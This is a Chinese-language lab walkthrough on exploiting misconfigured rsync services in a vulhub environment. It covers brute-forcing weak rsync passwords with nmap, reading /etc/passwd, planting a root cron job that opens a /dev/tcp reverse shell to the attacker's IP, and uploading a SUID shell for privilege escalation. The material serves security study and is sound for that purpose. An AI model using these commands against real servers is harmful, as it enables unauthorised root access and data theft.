# rsync
# 0x01 rsync简介
rsync是Linux下一款数据备份工具，它在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。同时支持通过rsync协议、ssh协议进行远程文件传输。常被用于在内网进行源代码的分发及同步更新，因此使用人群多为开发人员。

rsync协议默认监听873端口，而一般开发人员安全意识薄弱的情况下，如果目标开启了rsync服务，并且没有配置ACL或访问密码，而rsync默认是root权限，我们将可以读写目标服务器文件。

rsync默认配置文件为`/etc/rsyncd.conf`，若未包含授权账号行(auth users)，则为匿名访问。也可在其配置文件中为同步目录添加用户认证相关项，包括认证文件及授权账号。

常驻模式启动命令`rsync --no-detach --daemon --config /etc/rsyncd.conf`

启动成功后默认监听于TCP端口`873`，可通过`rsync-daemon`及`ssh`两种方式进行认证。

# 0x02 环境搭建
在[vulhub](https://github.com/vulhub/vulhub/tree/master/rsync/common)的基础上稍作修改

靶机：192.168.50.227

攻击机：192.168.50.53

## 服务端命令
启动rsync服务：
```
rsync --no-detach --daemon --config /etc/rsyncd.conf
```

指定端口启动rsync服务：
```
rsync --no-detach --port=888 --daemon --config /etc/rsyncd.conf
```

重启rsync服务:	
```
cat /var/run/rsyncd.pid比如得到了2222
kill -9 2222
rm -fr /var/run/rsyncd.pid
rsync --no-detach --daemon --config /etc/rsyncd.conf
```

## 有密码的`/etc/rsyncd.conf`环境配置

编辑`/etc/rsyncd.conf`
```
uid = root
gid = root
use chroot = no
max connections = 4
syslog facility = local5
pid file = /var/run/rsyncd.pid
log file = /var/log/rsyncd.log

[src]
path = /
comment = src path
read only = no
secrets file = /etc/rsync.pass
auth users = test

```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/175121174-9d1b2d64-97e6-46d9-a4d1-bf8f122564b4.png" /></div>

其用户认证文件内容为明文保存，但该文件权限必须设置为600，普通用户并无读取权限。

<div align=center><img src="https://user-images.githubusercontent.com/84888757/175121228-0ac60700-c901-4109-9792-539827b5faa3.png" /></div>

启动rsync服务：
```
rsync --no-detach --daemon --config /etc/rsyncd.conf
```

若认证文件权限设置错误，客户端用户即使口令输入正确，也会出现认证失败的提示信息。

<div align=center><img src="https://user-images.githubusercontent.com/84888757/175121264-c87a7571-f321-437e-a70b-604d2675f6c9.png" /></div>

# 0x03 基本利用方式
rsync 命令的语法如下：
```
rsync [options] [source] [target]
```
其中：
- options 表示各种可选参数；
- source 表示原文件或者原目录，可以是本地的，也可以是远程的；
- target 表示目标目录，可以是本地的，也可以是远程的。

## 3.1 rsync 未授权访问漏洞
参考这篇：[rsync未授权访问漏洞](https://github.com/reidmu/sec-note/blob/main/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/rsync/rsync%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md)


## 3.2 rsync 弱口令访问漏洞
### 3.2.1 获取模块信息

使用`rsync -avz user@192.168.50.227::`获取靶机rsync模块信息，后续暴破需要指定`module`。

<div align=center><img src="https://user-images.githubusercontent.com/84888757/175129886-e333229a-a653-4ed2-ab58-d4a4aa107db5.png" /></div>

### 3.2.2 暴破rsync弱口令
nmap中针对rsync口令暴力破解的脚本rsync-brute :https://svn.nmap.org/nmap/scripts/rsync-brute.nse。
```
# 默认的用户名字典、密码字典，自定义要暴破的rsync模块
nmap -p 873 -v --script rsync-brute --script-args 'rsync-brute.module=src' 192.168.50.227

# 自定义用户名字典、密码字典、暴破的rsync模块
nmap -sV --script rsync-brute --script-args 'userdb=/tmp/username.txt,passdb=/tmp/passwd.txt,rsync-brute.module=src' -p 873 192.168.50.227
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/175122937-88d3963a-cda6-424b-af7e-b49971f224ce.png" /></div>

### 3.2.3 访问rsync服务
```
rsync -avz test@192.168.50.227::
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/175136992-d0483e50-4d7d-413e-871c-e21d88b6938b.png" /></div>


若服务端SSH为非标准端口，可通过rsync的-e参数进行端口指定。
```
rsync -avz -e "ssh -p888" test@192.168.50.227::src
```

### 3.2.4 上传文件
```
rsync -avz /tmp/test1.txt test@192.168.50.227::src/tmp/
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/175137092-2e994d52-6b5a-49d1-9e40-7e65f519229e.png" /></div>


### 3.2.5 下载文件
```
rsync -avz test@192.168.50.227::src/etc/passwd /tmp
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/175137022-650ce448-71a6-4b30-b348-8dcc0deb163f.png" /></div>


### 3.2.6 通过写cron任务反弹shell
在`cron.d`增加定时任务 当我们要增加全局性的计划任务时，一种方式是直接修改`/etc/crontab`。但是，一般不建议这样做，`/etc/cron.d/`目录就是为了解决这种问题而创建的。

cron 执行时，要读取三个地方的配置文件：一是`/etc/crontab`，二是`/etc/cron.d`目录下的所有文件，三是每个用户的配置文件。

所以cron进程执行时，就会自动扫描`/etc/cron.d/`目录下的所有文件，按照文件中的时间设定执行后面的命令。

1、在本地编辑一个`crontab`文件
```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*  *    * * *   root    bash -c "bash -i >& /dev/tcp/192.168.50.53/6666 0>&1"
#
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/175131019-f02360e0-60a4-44b3-9622-40a9a6fba00a.png" /></div>


2、上传`crontab`文件到靶机的`/etc/cron.d/`目录下
```
rsync -avz /tmp/crontab test@192.168.50.227::src/etc/cron.d/
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/175131298-58f7431a-0145-4d60-bb07-f9022fb06d07.png" /></div>

3、kali监听6666端口，等待计划任务执行后反弹shell成功
```
nc -lvvp 6666
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/175131406-ac9cff85-d5a5-42d6-8728-628f8c3a1043.png" /></div>


# 0x04 其它利用思路
- 来自[rsync的几则tips（渗透技巧）](https://blog.csdn.net/kclax/article/details/93207941)

## 4.1 本地提权
由于rsync进程默认以root权限启动，在rsync为匿名访问或存在弱口令前提下，还可利用其在同步文件过程中保持源文件权限的特性，进行本地权限提升。
在本地将bash shell添加suid权限位，并通过rsync上传到服务端。
```
chmod a+s /tmp/shell
rsync -avz /tmp/shell test@192.168.50.227::src/var/www/html
```
在有普通用户shell权限前提下(通过rsync上传webshell或其他弱口令等漏洞)，切换到同步目录，查看上传的shell文件权限不变，运行后即可提升为root权限。

## 4.2 自动化脚本
Metasploit中关于允许匿名访问的rsync扫描模块：`auxiliary/scanner/rsync/modules_list`

无论有没有设置密码都能用该模块找到module，然后用nmap暴破。

<div align=center><img src="https://user-images.githubusercontent.com/84888757/175134557-ad7de6e1-25b7-4727-bd34-99edde8d2924.png" /></div>


# 0x05 参考链接
- [rsync的几则tips（渗透技巧）](https://blog.csdn.net/kclax/article/details/93207941)
- https://github.com/vulhub/vulhub/tree/master/rsync/common
